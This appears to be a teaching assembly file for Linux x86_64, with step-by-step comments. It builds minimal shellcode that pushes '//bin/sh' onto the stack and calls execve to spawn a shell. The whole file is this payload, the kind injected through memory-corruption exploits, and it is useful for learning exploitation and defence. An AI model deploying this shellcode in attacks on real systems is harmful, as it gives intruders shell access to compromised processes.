; -------------------------------------------------------------
; shell.s - Minimal shellcode that calls execve("/bin/sh", NULL, NULL)
;            on Linux x86_64 via the 'syscall' instruction.
;
; Assemble: nasm -f elf64 shell.s shell.o
; Link:     ld -o shell shell.o
; Run:      ./shell
; -------------------------------------------------------------

global _start            ; Export the _start label so the linker knows the entry point

section .text
_start:
    ; 1) Clear rax (will be used to pass NULL pointers)
    xor     rax, rax              ; rax = 0
    
    ; 2) Push 8 bytes of zero onto the stack for the string terminator "\0"
    push    rax                   ; stack now has [ \0 ]
    
    ; 3) Move the ASCII codes of "//bin/sh" into rbx
    ;    0x2f == '/' , 0x62 == 'b', 0x69 == 'i', 0x6e == 'n'
    ;    0x2f == '/', 0x73 == 's', 0x68 == 'h'
    ;    Combined into 64-bit: 0x68732f6e69622f2f == "hs/nib//" in reversed little-endian
    mov     rbx, 0x68732f6e69622f2f
    
    ; 4) Push that string onto the stack
    push    rbx                   ; stack now has [ "//bin/sh\0" ]
    
    ; 5) Set rdi to point to the string (1st argument to execve)
    mov     rdi, rsp              ; rdi = &("//bin/sh")
    
    ; 6) Set rsi and rdx to NULL (2nd and 3rd arguments: argv = NULL, envp = NULL)
    mov     rsi, rax              ; rsi = 0
    mov     rdx, rax              ; rdx = 0
    
    ; 7) Move the system call number for execve (59) into al (lowest 8 bits of rax)
    mov     al, 59                ; rax = 59
    
    ; 8) Trigger the system call. This replaces the current process with /bin/sh.
    syscall
